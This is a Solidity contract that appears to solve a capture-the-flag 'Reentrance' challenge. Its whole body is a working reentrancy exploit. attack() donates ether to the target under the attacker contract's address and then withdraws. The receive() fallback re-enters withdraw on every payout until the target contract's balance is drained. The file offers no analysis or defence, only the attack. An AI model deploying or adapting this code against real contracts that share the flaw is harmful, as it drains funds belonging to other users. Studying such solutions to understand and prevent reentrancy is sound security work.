// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

import "./Reentrance.sol";

contract ReentranceHack {
    Reentrance public challenge;
    uint256 initialDeposit;

    constructor(address challengeAddress) {
        challenge = Reentrance(payable(challengeAddress));
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");
        initialDeposit = msg.value;
        // send the funds to this contract's address
        challenge.donate{value: initialDeposit}(address(this));
        // withdraw again and again till no more funds
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 reetranceRemainingBalance = address(challenge).balance;
        // should we keep going ?
        bool stillFunds = reetranceRemainingBalance > 0;

        if (stillFunds) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 withdrawAmount = initialDeposit < reetranceRemainingBalance
                ? initialDeposit
                : reetranceRemainingBalance;
            challenge.withdraw(withdrawAmount);
        }
    }
}
